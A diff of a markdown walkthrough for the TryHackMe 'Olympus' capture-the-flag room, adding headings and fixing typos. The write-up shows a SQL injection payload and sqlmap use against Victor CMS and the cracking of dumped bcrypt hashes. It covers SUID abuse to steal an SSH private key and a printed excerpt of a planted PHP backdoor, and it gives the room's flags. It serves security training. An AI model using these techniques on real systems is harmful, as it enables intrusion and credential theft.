@@ -1,14 +1,35 @@
+---
+title: "Olympus - TryHackMe Writeup & Walkthrough"
+description: "Solving the Olympus room on TryHackMe using SQL injection, cracking hashes, and finding hidden endpoints."
+permalink: /TryHackMe/MEDIUM/Olympus/
+---
+
+# Olympus Writeup
+
+[![TryHackMe](https://img.shields.io/badge/TryHackMe-Medium-orange)](https://tryhackme.com/room/olympusroom)
+[![Category](https://img.shields.io/badge/Category-Web%20Exploitation-brightgreen)](#)
+
+> Room Link → [Olympus](https://tryhackme.com/room/olympusroom)
+
 ## Task 1: Connection
 
 Hey!
 
-Start the here and start enumerating! The machine can take some time to start. **Please allow up to 5 minutes** (Sorry for the inconvenience). **`Bruteforcing` against any login page is out of scope and should not be used**.
+Start the machine and start enumerating! The machine can take some time to start. **Please allow up to 5 minutes** (Sorry for the inconvenience). **`Bruteforcing` against any login page is out of scope and should not be used**.
 
 If you get stuck, you can find hints that will guide you on my GitHub repository (you'll find it in the walkthrough section).
 
 Well... Happy hacking ^^ 
 
 Petit Prince
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Enumeration](#enumeration)
+- [Exploitation](#exploitation)
+- [Flags](#flags)
+- [Privilege Escalation](#privilege-escalation)
 
 ---
 
@@ -18,7 +39,7 @@ Petit Prince
 
 ## Enumeration
 
-Let's try our luck with `rustscan`
+Let's start enumerating the machine.
 
 ```bash
 rustscan -a 10.49.154.120 -- -sCV -oN rust
@@ -70,11 +91,11 @@ So, here we are treated with the given page
 ![](attachment/d6d893489354203a75cfc50b077e4cca.png)
 
 > [!HINT]
-> The old version of the website is till accessible on this domain
+> The old version of the website is still accessible on this domain
 
-Thus, let's try to enumerate further and see where we can access the old version -- hope it will helpful to us...
+Thus, let's try to enumerate further and see where we can access the old version -- hope it will be helpful to us...
 
-With the help of `gobuster` we were able to find the following
+Let's start with `gobuster` to find something interesting...
 
 ```bash
  gobuster dir -u http://olympus.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 80 -x .php, .js, .html | tee -a dir_scan
@@ -152,23 +173,25 @@ Maybe in future we will need a wordlist the one user is talking about here.
 
 ---
 
+## Exploitation
+
 We know that the old version of the site is using `Victor's CMS` so let's try to find if we get any exploits for it...
 
 ```bash
 └─$ searchsploit "Victor CMS"
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                                                                                            |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting                                                                                                                                               | php/webapps/48511.txt
-Victor CMS 1.0 - 'cat_id' SQL Injection                                                                                                                                                                   | php/webapps/48485.txt
-Victor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting                                                                                                                                         | php/webapps/48484.txt
-Victor CMS 1.0 - 'post' SQL Injection                                                                                                                                                                     | php/webapps/48451.txt
-Victor CMS 1.0 - 'Search' SQL Injection                                                                                                                                                                   | php/webapps/48734.txt
-Victor CMS 1.0 - 'user_firstname' Persistent Cross-Site Scripting                                                                                                                                         | php/webapps/48626.txt
-Victor CMS 1.0 - Authenticated Arbitrary File Upload                                                                                                                                                      | php/webapps/48490.txt
-Victor CMS 1.0 - File Upload To RCE                                                                                                                                                                       | php/webapps/49310.txt
-Victor CMS 1.0 - Multiple SQL Injection (Authenticated)                                                                                                                                                   | php/webapps/49282.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+---
+ Exploit Title                                                              |  Path
+---
+Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting                 | php/webapps/48511.txt
+Victor CMS 1.0 - 'cat_id' SQL Injection                                     | php/webapps/48485.txt
+Victor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting           | php/webapps/48484.txt
+Victor CMS 1.0 - 'post' SQL Injection                                       | php/webapps/48451.txt
+Victor CMS 1.0 - 'Search' SQL Injection                                     | php/webapps/48734.txt
+Victor CMS 1.0 - 'user_firstname' Persistent Cross-Site Scripting           | php/webapps/48626.txt
+Victor CMS 1.0 - Authenticated Arbitrary File Upload                        | php/webapps/48490.txt
+Victor CMS 1.0 - File Upload To RCE                                         | php/webapps/49310.txt
+Victor CMS 1.0 - Multiple SQL Injection (Authenticated)                     | php/webapps/49282.txt
+---
 ```
 
 YUPP JACKPOT!!
@@ -197,11 +220,13 @@ http://localhost/category.php?cat_id=-1+UNION+SELECT+1,2,VERSION(),DATABASE(),5,
 By exploiting the SQL Injection vulnerability by using the mentioned payload, an attacker will be able to retrieve the database name and version of mysql running on the server.
 ```
 
-We can see below we can the database name and version are shown with the help of `?cat_id`
+We can see below the database name and version are shown with the help of `?cat_id`
 
 - MySQL version: 8.0.28-0ubuntu0.20.04.3
 - Database name: `olympus`
   ![](attachment/20cc84686cb7f1cadef5b323c17fc344.png)
+
+## Flags
 
 Now we can automate our process of getting flag from database using `sqlmap` for info -- [Check this exploit on exploitdb](https://www.exploit-db.com/exploits/48734#:~:text=sqlmap%20%2Du%20%22http%3A%2F%2Fexample%2Ecom%2FCMSsite%2Fsearch%2Ephp%22%20%2D%2Ddata%3D%22search%3D1337%2A%26submit%3D%22%20%2D%2Ddbs%20%2D%2Drandom%2Dagent%20%2Dv%203)
 
@@ -293,7 +318,7 @@ Given hashes are `bcrypt` hash-type can we brute force it ? Let's try it out ..
 
 Save all three hashes in a file > `hashes`
 
-```plain
+```hash
 $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
 $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
 $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
@@ -322,7 +347,7 @@ In `Users` section we can see all three users but see the domains of the emails 
 
 ![](attachment/d21f609abaff6f8939530f42c21a5d53.png)
 
-> We found these in our DB dump also but I didn't thought any of it (:])
+> We found these in our DB dump also but I didn't think anything of it (😅)
 
 `Ahhh`. So now let's add this domain in our SPECIAL file `/etc/hosts` and dive in it...
 
@@ -401,6 +426,8 @@ I've now got a permanent access as a super user to the olympus.
 
 ```
 
+## Privilege Escalation
+
 Now, we should first check with SUID executables so that we can run it as `zeus` for our own :)...
 
 And we found this one
@@ -413,7 +440,6 @@ Which the user `zeus` can execute.
 
 ```bash
 -rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
-
 ```
 
 After running, it asked for a source file and a target file so I tried giving the path of `private` `id_rsa` file which stays inside `/home/user/.ssh` folder
@@ -468,11 +494,11 @@ eRZjPBIy1rjIUiWe6LS1ToEyqfY=
 ```
 
 - Save the private key as `id_rsa` in our system
-- change it's permissions to `400`
-  `chmod 400 id_rsa`
+- change its permissions to `400`
+  - `chmod 400 id_rsa`
 - Log in using the private key
 
-AHH WHY IS IT ALWAYS `PLEASE ENTER YOU PASSWORD` why not `YEAH GO IN` -- until its our turn ⚠️
+AHH WHY IS IT ALWAYS `PLEASE ENTER YOUR PASSWORD` & why not `YEAH GO IN` ---- until its our creds ⚠️
 
 ![](attachment/f94c4fe54b6d625c71d953ee67b8acab.png)
 
@@ -521,6 +547,7 @@ drwxr-xr-x 3 www-data www-data 4.0K May  1  2022 ..
 and `VIGQFQFMYOST.php` consist this script
 
 ```php
+{% raw %}
 <?php
 $pass = "a7c5ffcf139742f52a5267c4a0674129";
 if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');
@@ -563,6 +590,7 @@ fclose($sock);
 for($x=0;$x<=2;$x++) fclose($pipes[x]);
 proc_close($proc);
 ?>
+{% endraw %}
 ```
 
 We've got a pass variable
@@ -634,7 +662,7 @@ WE ARE FINALLY LOGGED IN AS ROOT ...
 
 
 
-                   flag{D4mN!_Y0u_G0T_m3_:)_}
+> **Root Flag**: `flag{D4mN!_Y0u_G0T_m3_:)_}`
 
 
 
@@ -663,10 +691,10 @@ grep -r flag .
 ./ssl/private/.b0nus.fl4g:flag{Y0u_G0t_m3_g00d!}
 ```
 
-FINAL FINAL HIDDEN FLAG: `flag{Y0u_G0t_m3_g00d!}`
+> **Bonus Flag**: `flag{Y0u_G0t_m3_g00d!}`
 
 ---
 
-YAAYYY IT'S FINALY DONE
+YAAYYY IT'S FINALLY DONE
 
 Happy Hacking 🔍😎!!
